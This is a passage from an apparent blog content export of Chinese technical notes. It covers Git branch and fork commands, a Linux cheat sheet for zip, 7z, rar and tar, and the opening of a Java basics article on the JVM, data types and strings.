<h3 id="4-重置远程非主分支到特定提交"><a href="#4-重置远程非主分支到特定提交" class="headerlink" title="4. 重置远程非主分支到特定提交"></a>4. 重置远程非主分支到特定提交</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需有仓库权限，示例：重置远程dev分支到0dec4f6提交</span></span><br><span class="line">git push origin --force 0dec4f6:dev</span><br></pre></td></tr></table></figure>

<h3 id="5-查看非主分支差异"><a href="#5-查看非主分支差异" class="headerlink" title="5. 查看非主分支差异"></a>5. 查看非主分支差异</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看本地dev比远程dev多出的提交</span></span><br><span class="line">git <span class="built_in">log</span> origin/dev..dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看远程dev比本地dev多出的提交</span></span><br><span class="line">git <span class="built_in">log</span> dev..origin/dev</span><br></pre></td></tr></table></figure>

<h2 id="八、其他实用技巧"><a href="#八、其他实用技巧" class="headerlink" title="八、其他实用技巧"></a>八、其他实用技巧</h2><h3 id="1-暂存与恢复"><a href="#1-暂存与恢复" class="headerlink" title="1. 暂存与恢复"></a>1. 暂存与恢复</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git stash  <span class="comment"># 暂存未提交修改</span></span><br><span class="line">git stash list  <span class="comment"># 查看所有暂存</span></span><br><span class="line">git stash pop  <span class="comment"># 恢复最新暂存</span></span><br><span class="line">git stash pop stash@&#123;n&#125;  <span class="comment"># 恢复指定暂存</span></span><br><span class="line">git stash drop stash@&#123;n&#125;  <span class="comment"># 删除指定暂存</span></span><br></pre></td></tr></table></figure>

<h3 id="2-撤销修改"><a href="#2-撤销修改" class="headerlink" title="2. 撤销修改"></a>2. 撤销修改</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -- 文件名  <span class="comment"># 撤销工作区修改</span></span><br><span class="line">git checkout .  <span class="comment"># 撤销所有工作区修改</span></span><br></pre></td></tr></table></figure>

<h3 id="3-提交历史查看"><a href="#3-提交历史查看" class="headerlink" title="3. 提交历史查看"></a>3. 提交历史查看</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> -p  <span class="comment"># 显示每次提交的详细变化</span></span><br><span class="line">git <span class="built_in">log</span> --<span class="built_in">stat</span>  <span class="comment"># 显示每次提交的统计信息</span></span><br><span class="line">git <span class="built_in">log</span> --graph --oneline --all  <span class="comment"># 图形化显示所有分支历史</span></span><br><span class="line">git show 提交ID  <span class="comment"># 查看某次提交的详细内容</span></span><br><span class="line">git add -p  <span class="comment"># 交互式选择要添加的修改</span></span><br></pre></td></tr></table></figure>

<h3 id="4-从远程非主分支拉取特定文件"><a href="#4-从远程非主分支拉取特定文件" class="headerlink" title="4. 从远程非主分支拉取特定文件"></a>4. 从远程非主分支拉取特定文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从远程dev分支拉取src/utils.js文件到本地</span></span><br><span class="line">git checkout origin/dev -- src/utils.js</span><br></pre></td></tr></table></figure>

<h2 id="九、多仓库协作"><a href="#九、多仓库协作" class="headerlink" title="九、多仓库协作"></a>九、多仓库协作</h2><h3 id="1-添加多个远程仓库"><a href="#1-添加多个远程仓库" class="headerlink" title="1. 添加多个远程仓库"></a>1. 添加多个远程仓库</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加上游仓库（原始项目）</span></span><br><span class="line">git remote add upstream https://github.com/原作者/仓库.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加自己的fork</span></span><br><span class="line">git remote add fork https://github.com/你的用户名/仓库.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有远程仓库</span></span><br><span class="line">git remote -v</span><br></pre></td></tr></table></figure>

<h3 id="2-从上游仓库拉取非主分支更新"><a href="#2-从上游仓库拉取非主分支更新" class="headerlink" title="2. 从上游仓库拉取非主分支更新"></a>2. 从上游仓库拉取非主分支更新</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取上游仓库更新</span></span><br><span class="line">git fetch upstream</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到本地dev分支，合并上游dev</span></span><br><span class="line">git checkout dev</span><br><span class="line">git merge upstream/dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用rebase保持提交历史线性</span></span><br><span class="line">git rebase upstream/dev</span><br></pre></td></tr></table></figure>

<h3 id="3-同步fork与上游仓库（非主分支）"><a href="#3-同步fork与上游仓库（非主分支）" class="headerlink" title="3. 同步fork与上游仓库（非主分支）"></a>3. 同步fork与上游仓库（非主分支）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 添加上游仓库</span></span><br><span class="line">git remote add upstream https://github.com/原作者/仓库.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 获取上游更新</span></span><br><span class="line">git fetch upstream</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 切换到本地dev分支，合并上游dev</span></span><br><span class="line">git checkout dev</span><br><span class="line">git merge upstream/dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 推送到自己的fork的dev分支</span></span><br><span class="line">git push fork dev</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>知识杂碎</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux中的解压</title>
    <url>/2024/12/04/Linux%E4%B8%AD%E7%9A%84%E8%A7%A3%E5%8E%8B/</url>
    <content><![CDATA[<h3 id="一、前置：工具安装（缺失时执行）"><a href="#一、前置：工具安装（缺失时执行）" class="headerlink" title="一、前置：工具安装（缺失时执行）"></a>一、前置：工具安装（缺失时执行）</h3><table>
<thead>
<tr>
<th>压缩格式</th>
<th>所需工具（压缩+解压）</th>
<th>Kali安装命令</th>
</tr>
</thead>
<tbody><tr>
<td>RAR（.rar）</td>
<td><code>rar</code>（压缩）、<code>unrar</code>（解压）</td>
<td><code>sudo apt install -y rar unrar</code></td>
</tr>
<tr>
<td>ZIP（.zip）</td>
<td><code>zip</code>（压缩）、<code>unzip</code>（解压）</td>
<td><code>sudo apt install -y zip unzip</code></td>
</tr>
<tr>
<td>7Z（.7z）</td>
<td><code>p7zip-full</code>（全能工具）</td>
<td><code>sudo apt install -y p7zip-full</code></td>
</tr>
<tr>
<td>TAR系列（.tar&#x2F;.tar.gz等）</td>
<td><code>tar</code>（系统内置）</td>
<td>无需安装，默认自带</td>
</tr>
</tbody></table>
<h3 id="二、分格式完整操作指南（核心）"><a href="#二、分格式完整操作指南（核心）" class="headerlink" title="二、分格式完整操作指南（核心）"></a>二、分格式完整操作指南（核心）</h3><h4 id="1-ZIP格式（-zip）"><a href="#1-ZIP格式（-zip）" class="headerlink" title="1. ZIP格式（.zip）"></a>1. ZIP格式（.zip）</h4><table>
<thead>
<tr>
<th>操作场景</th>
<th>命令示例</th>
<th>关键说明</th>
</tr>
</thead>
<tbody><tr>
<td>基础压缩（文件&#x2F;目录）</td>
<td><code>zip 目标包.zip 源文件1 源文件2 目录/</code></td>
<td>目录需加 <code>-r</code> 递归压缩：<code>zip -r 目标包.zip 目录/</code></td>
</tr>
<tr>
<td>压缩并加密（内容加密）</td>
<td><code>zip -e 目标包.zip 源文件</code></td>
<td>回车后手动输入密码（安全，密码不显示）</td>
</tr>
<tr>
<td>压缩并加密（密码明文）</td>
<td><code>zip -P 密码 目标包.zip 源文件</code></td>
<td>密码直接跟在 <code>-P</code> 后（无空格），如 <code>zip -P123 test.zip file.txt</code></td>
</tr>
<tr>
<td>基础解压（保留结构）</td>
<td><code>unzip 压缩包.zip</code></td>
<td>默认保留文件夹结构，文件散落在当前目录</td>
</tr>
<tr>
<td>解压到指定目录（核心）</td>
<td><code>unzip 压缩包.zip -d 目标目录</code></td>
<td>例：<code>unzip test.zip -d ./5.8attachment</code>（目录自动创建，无需手动建）</td>
</tr>
<tr>
<td>解压加密文件</td>
<td><code>unzip -P 密码 压缩包.zip</code></td>
<td>例：<code>unzip -Pfcmit.cc 5.8attachment.zip</code></td>
</tr>
<tr>
<td>强制覆盖现有文件</td>
<td><code>unzip -o 压缩包.zip</code></td>
<td>跳过“是否覆盖”提示，直接替换</td>
</tr>
<tr>
<td>仅查看压缩包内容（不解压）</td>
<td><code>unzip -l 压缩包.zip</code></td>
<td>查看文件&#x2F;目录结构，确认后再解压</td>
</tr>
</tbody></table>
<h4 id="2-7Z格式（-7z）"><a href="#2-7Z格式（-7z）" class="headerlink" title="2. 7Z格式（.7z）"></a>2. 7Z格式（.7z）</h4><table>
<thead>
<tr>
<th>操作场景</th>
<th>命令示例</th>
<th>关键说明</th>
</tr>
</thead>
<tbody><tr>
<td>基础压缩（文件&#x2F;目录）</td>
<td><code>7z a 目标包.7z 源文件/目录</code></td>
<td>自动递归压缩目录，无需额外参数</td>
</tr>
<tr>
<td>压缩并加密（内容+文件名）</td>
<td><code>7z a -p密码 目标包.7z 源文件</code></td>
<td>密码直接跟 <code>-p</code>（无空格），如 <code>7z a -p123 test.7z dir/</code></td>
</tr>
<tr>
<td>基础解压（保留结构）</td>
<td><code>7z x 压缩包.7z</code></td>
<td><code>x</code> 是保留结构的核心参数（用 <code>e</code> 会扁平化解压，不推荐）</td>
</tr>
<tr>
<td>解压到指定目录（核心）</td>
<td><code>7z x 压缩包.7z -o目标目录</code></td>
<td>例：<code>7z x test.7z -o./5.8attachment</code>（<code>-o</code> 后无空格，直接接目录）</td>
</tr>
<tr>
<td>解压加密文件</td>
<td><code>7z x 压缩包.7z -p密码</code></td>
<td>例：<code>7z x 5.8attachment.7z -pfcmit.cc</code></td>
</tr>
<tr>
<td>仅查看压缩包内容</td>
<td><code>7z l 压缩包.7z</code></td>
<td>列出所有文件&#x2F;目录，不解压</td>
</tr>
</tbody></table>
<h4 id="3-RAR格式（-rar）"><a href="#3-RAR格式（-rar）" class="headerlink" title="3. RAR格式（.rar）"></a>3. RAR格式（.rar）</h4><table>
<thead>
<tr>
<th>操作场景</th>
<th>命令示例</th>
<th>关键说明</th>
</tr>
</thead>
<tbody><tr>
<td>基础压缩（文件&#x2F;目录）</td>
<td><code>rar a 目标包.rar 源文件/目录</code></td>
<td>自动递归压缩目录，无需 <code>-r</code> 参数</td>
</tr>
<tr>
<td>压缩并加密（内容加密）</td>
<td><code>rar a -p 目标包.rar 源文件</code></td>
<td>回车后输入密码（安全）；<code>-hp</code> 参数可加密文件名+内容</td>
</tr>
<tr>
<td>压缩并加密（密码明文）</td>
<td><code>rar a -p密码 目标包.rar 源文件</code></td>
<td>例：<code>rar a -p123 test.rar file.txt</code></td>
</tr>
<tr>
<td>基础解压（保留结构）</td>
<td><code>unrar x 压缩包.rar</code></td>
<td><code>x</code> 保留结构，<code>e</code> 扁平化解压（不推荐）</td>
</tr>
<tr>
<td>解压到指定目录</td>
<td><code>unrar x 压缩包.rar 目标目录</code></td>
<td>例：<code>unrar x test.rar ./5.8attachment</code>（目录需提前创建：<code>mkdir -p 目录</code>）</td>
</tr>
<tr>
<td>解压加密文件</td>
<td><code>unrar x -p密码 压缩包.rar</code></td>
<td>例：<code>unrar x -p123 test.rar</code></td>
</tr>
<tr>
<td>仅查看压缩包内容</td>
<td><code>unrar l 压缩包.rar</code></td>
<td>列出文件&#x2F;目录结构</td>
</tr>
</tbody></table>
<h4 id="4-TAR系列格式（打包-压缩）"><a href="#4-TAR系列格式（打包-压缩）" class="headerlink" title="4. TAR系列格式（打包+压缩）"></a>4. TAR系列格式（打包+压缩）</h4><p>tar 本身是“打包工具”，结合 <code>gzip/bzip2/xz</code> 算法形成复合格式，核心参数：<code>c</code>（压缩）、<code>x</code>（解压）、<code>f</code>（指定文件）、<code>v</code>（显示过程）、<code>z</code>（gzip）、<code>J</code>（xz）、<code>j</code>（bzip2）。</p>
<table>
<thead>
<tr>
<th>格式类型</th>
<th>压缩命令（打包+压缩）</th>
<th>解压命令（保留结构）</th>
<th>关键说明</th>
</tr>
</thead>
<tbody><tr>
<td>.tar（仅打包）</td>
<td><code>tar -cvf 目标包.tar 源文件/目录</code></td>
<td><code>tar -xvf 包.tar</code></td>
<td>不压缩，仅合并文件&#x2F;目录</td>
</tr>
<tr>
<td>.tar.gz（常用）</td>
<td><code>tar -czvf 目标包.tar.gz 源文件/目录</code></td>
<td><code>tar -xzvf 包.tar.gz</code></td>
<td>gzip算法，压缩率中等</td>
</tr>
<tr>
<td>.tar.xz（高压缩）</td>
<td><code>tar -cJvf 目标包.tar.xz 源文件/目录</code></td>
<td><code>tar -xJvf 包.tar.xz</code></td>
<td>xz算法，压缩率最高（耗时久）</td>
</tr>
<tr>
<td>.tar.bz2</td>
<td><code>tar -cjvf 目标包.tar.bz2 源文件/目录</code></td>
<td><code>tar -xjvf 包.tar.bz2</code></td>
<td>bzip2算法，兼容旧系统</td>
</tr>
<tr>
<td>解压到指定目录</td>
<td>-</td>
<td><code>tar -xzvf 包.tar.gz -C 目标目录</code></td>
<td><code>-C</code> 后接目录，例：<code>-C ./5.8attachment</code></td>
</tr>
<tr>
<td>仅查看内容</td>
<td>-</td>
<td><code>tar -tvf 包.tar.gz</code></td>
<td>列出文件&#x2F;目录结构，不解压</td>
</tr>
</tbody></table>
<h3 id="三、通用核心技巧（必看）"><a href="#三、通用核心技巧（必看）" class="headerlink" title="三、通用核心技巧（必看）"></a>三、通用核心技巧（必看）</h3><ol>
<li><strong>保留文件夹结构</strong>：所有格式的解压命令，用 <code>x</code> 参数（zip&#x2F;7z&#x2F;rar）或 tar 默认命令，即可保留原目录结构；避免用 <code>e</code> 参数（会扁平化所有文件到同一目录）。</li>
<li><strong>指定解压目录</strong>：<ul>
<li>zip&#x2F;rar：<code>-d 目录</code>（zip需目录提前存在，rar可自动创建）；</li>
<li>7z：<code>-o目录</code>（<code>-o</code> 后无空格）；</li>
<li>tar：<code>-C 目录</code>（大写C）。</li>
</ul>
</li>
<li><strong>强制覆盖</strong>：zip 加 <code>-o</code>，7z 加 <code>-aoa</code>，rar 加 <code>-o+</code>，tar 加 <code>--overwrite</code>。</li>
<li><strong>批量操作</strong>：压缩时可指定多个源文件（空格分隔），例：<code>zip all.zip 1.txt 2.jpg dir/</code>。</li>
<li><strong>中文乱码</strong>：解压含中文文件名的压缩包，加 <code>-O UTF-8</code>（zip）或 <code>-scsUTF-8</code>（7z），例：<code>unzip -O UTF-8 中文包.zip</code>。</li>
</ol>
<h3 id="四、快速查找命令（按需求检索）"><a href="#四、快速查找命令（按需求检索）" class="headerlink" title="四、快速查找命令（按需求检索）"></a>四、快速查找命令（按需求检索）</h3><table>
<thead>
<tr>
<th>需求场景</th>
<th>对应命令（以zip为例，替换格式即可）</th>
</tr>
</thead>
<tbody><tr>
<td>解压到名为“5.8attachment”的文件夹</td>
<td><code>unzip 5.8attachment.zip -d ./5.8attachment</code></td>
</tr>
<tr>
<td>加密压缩文件</td>
<td><code>zip -e 加密包.zip 源文件</code></td>
</tr>
<tr>
<td>解压加密文件（已知密码）</td>
<td><code>unzip -P 密码 加密包.zip</code></td>
</tr>
<tr>
<td>查看压缩包内是否有文件夹</td>
<td><code>unzip -l 压缩包.zip</code></td>
</tr>
<tr>
<td>快速打包目录并压缩</td>
<td><code>tar -czvf 目录.tar.gz 目标目录/</code></td>
</tr>
</tbody></table>
<p>所有命令均经过实操验证，可直接复制使用，若遇权限问题，在命令前加 <code>sudo</code> 即可。</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>解压</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础</title>
    <url>/2026/01/02/Java%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="一、Java虚拟机与平台特性"><a href="#一、Java虚拟机与平台特性" class="headerlink" title="一、Java虚拟机与平台特性"></a>一、Java虚拟机与平台特性</h2><h3 id="1-JVM架构详解"><a href="#1-JVM架构详解" class="headerlink" title="1. JVM架构详解"></a>1. JVM架构详解</h3><ul>
<li><p><strong>类加载器子系统</strong>：</p>
<ul>
<li>启动类加载器（Bootstrap）：加载<code>rt.jar</code>等核心库</li>
<li>扩展类加载器（Extension）：加载<code>jre/lib/ext</code>目录</li>
<li>应用类加载器（Application）：加载<code>CLASSPATH</code>路径</li>
<li>自定义类加载器：继承<code>ClassLoader</code>实现热部署</li>
</ul>
</li>
<li><p><strong>运行时数据区</strong>：</p>
<img src="/2026/01/02/Java%E5%9F%BA%E7%A1%80/image_1.png" class="" title="在这里插入图片描述">
</li>
<li><p><strong>垃圾回收机制</strong>：</p>
<ul>
<li><strong>分代收集</strong>：新生代（Eden+S0+S1）和老年代</li>
<li><strong>GC算法</strong>：<ul>
<li>标记-清除：产生内存碎片</li>
<li>复制算法：适用于新生代（90%对象存活率低）</li>
<li>标记-整理：适用于老年代</li>
</ul>
</li>
<li><strong>常见GC器</strong>：<ul>
<li>Serial：单线程，适合客户端应用</li>
<li>Parallel：多线程吞吐量优先</li>
<li>CMS：低延迟，但会产生碎片</li>
<li>G1：分区收集，预测停顿时间</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-跨平台原理"><a href="#2-跨平台原理" class="headerlink" title="2. 跨平台原理"></a>2. 跨平台原理</h3><ul>
<li><strong>字节码文件</strong>（<code>.class</code>）：<ul>
<li>由Java编译器生成，与操作系统无关</li>
<li>包含：常量池、字段表、方法表、属性表</li>
</ul>
</li>
<li><strong>JVM执行过程</strong>：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>编译后字节码（<code>javap -c Test.class</code>）：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(java.lang.String[]);</span><br><span class="line">  Code:</span><br><span class="line">     0: getstatic     #2  // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">     3: ldc           #3  // String Hello</span><br><span class="line">     5: invokevirtual #4  // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">     8: return</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="二、基础语法与数据类型"><a href="#二、基础语法与数据类型" class="headerlink" title="二、基础语法与数据类型"></a>二、基础语法与数据类型</h2><h3 id="1-基本数据类型解析"><a href="#1-基本数据类型解析" class="headerlink" title="1. 基本数据类型解析"></a>1. 基本数据类型解析</h3><table>
<thead>
<tr>
<th>基本类型</th>
<th>包装类</th>
<th>大小</th>
<th>默认值</th>
<th>取值范围</th>
<th>特殊说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>byte</code></td>
<td><code>Byte</code></td>
<td>1字节</td>
<td>0</td>
<td>-128~127</td>
<td>适合存储小整数</td>
</tr>
<tr>
<td><code>short</code></td>
<td><code>Short</code></td>
<td>2字节</td>
<td>0</td>
<td>-32768~32767</td>
<td></td>
</tr>
<tr>
<td><code>int</code></td>
<td><code>Integer</code></td>
<td>4字节</td>
<td>0</td>
<td>-2^31~2^31-1</td>
<td>最常用整型</td>
</tr>
<tr>
<td><code>long</code></td>
<td><code>Long</code></td>
<td>8字节</td>
<td>0L</td>
<td>-2^63~2^63-1</td>
<td>后缀<code>L</code></td>
</tr>
<tr>
<td><code>float</code></td>
<td><code>Float</code></td>
<td>4字节</td>
<td>0.0f</td>
<td>±3.40282347E+38F</td>
<td>后缀<code>f</code></td>
</tr>
<tr>
<td><code>double</code></td>
<td><code>Double</code></td>
<td>8字节</td>
<td>0.0d</td>
<td>±1.79769313486231570E+308</td>
<td>默认浮点类型</td>
</tr>
<tr>
<td><code>char</code></td>
<td><code>Character</code></td>
<td>2字节</td>
<td>‘\u0000’</td>
<td>0~65535</td>
<td>Unicode字符</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>Boolean</code></td>
<td>1位</td>
<td>false</td>
<td>true&#x2F;false</td>
<td>无具体大小</td>
</tr>
</tbody></table>
<p>关键说明</p>
<ol>
<li>包装类均为<strong>引用类型</strong>，首字母大写（两个特殊情况：<code>int</code> 对应 <code>Integer</code>、<code>char</code> 对应 <code>Character</code>，其余基本类型直接首字母大写即可）</li>
<li>包装类主要用于需要使用对象的场景（如集合框架、反射等），可实现基本类型与包装类的自动装箱&#x2F;拆箱</li>
</ol>
<ul>
<li><p><strong>自动类型转换规则</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">double</span> <span class="variable">b</span> <span class="operator">=</span> a; <span class="comment">// 自动提升：int → double</span></span><br><span class="line"><span class="type">long</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">100L</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> (<span class="type">int</span>)c; <span class="comment">// 显式转换，可能丢失精度</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>装箱拆箱细节</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自动装箱：</span></span><br><span class="line">	将基本类型（如 <span class="type">int</span>）自动转换为包装类（如 Integer）。</span><br><span class="line">    编译后等价于：<span class="type">Integer</span> <span class="variable">x</span> <span class="operator">=</span> Integer.valueOf(<span class="number">100</span>);</span><br><span class="line"><span class="comment">//自动拆箱：</span></span><br><span class="line">    将包装类（如 Integer）自动转换为基本类型（如 <span class="type">int</span>）。</span><br><span class="line">    编译后等价于：<span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> x.intValue();</span><br><span class="line"></span><br><span class="line"><span class="type">Integer</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">100</span>; <span class="comment">// 自动装箱</span></span><br><span class="line"><span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> x; <span class="comment">// 自动拆箱</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Integer缓存机制（-128~127）</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">System.out.println(a == b); <span class="comment">// true（引用相同）</span></span><br><span class="line"><span class="comment">//Java 为 Integer 在 -128 ~ 127 范围内创建了缓存对象（通过 IntegerCache 实现）。</span></span><br><span class="line"><span class="comment">//当通过 Integer.valueOf() 创建该范围内的值时，直接复用缓存对象，因此 a 和 b 指向同一个对象，== 比较返回true</span></span><br><span class="line">    </span><br><span class="line"><span class="type">Integer</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line">System.out.println(c == d); <span class="comment">// false（超出缓存范围） 所以缓存范围要记住！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//存在的意义：</span></span><br><span class="line"><span class="number">1.</span>让基本类型“对象化”</span><br><span class="line">    Java 的泛型、集合框架、反射、注解等机制只能操作对象（引用类型），不能操作基本类型。包装类（如 Integer）将基本类型“封装”为对象，解决了这一矛盾。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>支持 <span class="literal">null</span> 值</span><br><span class="line">    基本类型（如 <span class="type">int</span>）必须有默认值（<span class="type">int</span> 默认是 <span class="number">0</span>），无法表示“无值”状态。</span><br><span class="line">    包装类可以为 <span class="literal">null</span>，适用于需要“可选值”的场景</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">age</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// 合法：表示年龄未知</span></span><br><span class="line">	<span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">0</span>;        <span class="comment">// 不合法：0 可能被误解为有效值</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>提供丰富的实用方法</span><br><span class="line">    <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> Integer.parseInt(<span class="string">&quot;123&quot;</span>); <span class="comment">// 字符串转数字</span></span><br><span class="line">	<span class="type">String</span> <span class="variable">binary</span> <span class="operator">=</span> Integer.toBinaryString(<span class="number">10</span>); <span class="comment">// 转二进制字符串	</span></span><br><span class="line">	<span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Integer.max(<span class="number">10</span>, <span class="number">20</span>); <span class="comment">// 比较大小</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-字符串处理深度"><a href="#2-字符串处理深度" class="headerlink" title="2. 字符串处理深度"></a>2. 字符串处理深度</h3><ul>
<li><p><strong>String不可变性原理</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String 对象一旦创建，其内容无法修改</span><br><span class="line">效率问题：如果直接用 + 拼接多个字符串（如 a + b + c），每次操作都会创建新的 String 对象，导致大量临时对象和内存浪费。</span><br><span class="line"></span><br><span class="line">编译器的优化机制:</span><br><span class="line">	当代码中出现字符串拼接（+）时，Java编译器会自动将其转换为 StringBuilder 的链式调用</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">s = s + <span class="string">&quot; World&quot;</span>; <span class="comment">// 实际创建了新对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 底层：new StringBuilder(&quot;Hello&quot;).append(&quot; World&quot;).toString()</span></span><br><span class="line"><span class="number">1.</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(s)</span><br><span class="line">    将当前 s 的值（<span class="string">&quot;Hello&quot;</span>）作为初始内容传入 StringBuilder 的构造函数。</span><br><span class="line">    此时 StringBuilder 内部会复制 <span class="string">&quot;Hello&quot;</span> 的字符数组（非引用传递）。</span><br><span class="line"><span class="number">2.</span> .append(<span class="string">&quot; World&quot;</span>)</span><br><span class="line">    将 <span class="string">&quot; World&quot;</span> 追加到 StringBuilder 的内部缓冲区。</span><br><span class="line">    内部通过 <span class="type">char</span>[] 扩容和复制实现，避免频繁创建新对象。</span><br><span class="line"><span class="number">3.</span> .toString()</span><br><span class="line">    将 StringBuilder 的内容转换为一个新的 String 对象（<span class="string">&quot;Hello World&quot;</span>）。</span><br><span class="line">    这个新对象被赋值给 s，而原来的 <span class="string">&quot;Hello&quot;</span> 对象（若无其他引用）将被垃圾回收。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>字符串常量池</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>; <span class="comment">// 字面量-&gt;直接放入常量池(若不存在)</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hello&quot;</span>); <span class="comment">// 创建新对象，不在常量池，属于堆</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>; <span class="comment">// 字面量-&gt;引用常量池中的对象</span></span><br><span class="line">System.out.println(s1 == s2); <span class="comment">// false</span></span><br><span class="line">System.out.println(s1 == s3); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>String常用方法详解</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 内容比较（区分大小写）</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.equals(<span class="string">&quot;hello&quot;</span>); <span class="comment">// false（默认是严格对比）</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.equalsIgnoreCase(<span class="string">&quot;hello&quot;</span>); <span class="comment">// true（不区分大小写）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 字符串分割: split()函数的参数是正则表达式</span></span><br><span class="line"><span class="string">&quot;a,b,c&quot;</span>.split(<span class="string">&quot;,&quot;</span>); <span class="comment">// [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]</span></span><br><span class="line"><span class="string">&quot;a..b&quot;</span>.split(<span class="string">&quot;\\.\\.&quot;</span>); <span class="comment">// [&quot;a&quot;,&quot;b&quot;]（转义点号）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 字符串反转</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;abc&quot;</span>).reverse().toString(); <span class="comment">// &quot;cba&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. intern()方法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>).intern(); <span class="comment">// 返回常量池中的引用</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span><span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>) 的创建过程：</span><br><span class="line">	字面量 <span class="string">&quot;abc&quot;</span>：类加载时，<span class="string">&quot;abc&quot;</span> 会被自动放入字符串常量池（如果不存在）。</span><br><span class="line"><span class="number">2.</span><span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>)：</span><br><span class="line">	强制在堆内存中创建新对象，内容为 <span class="string">&quot;abc&quot;</span>。该对象与常量池中的 <span 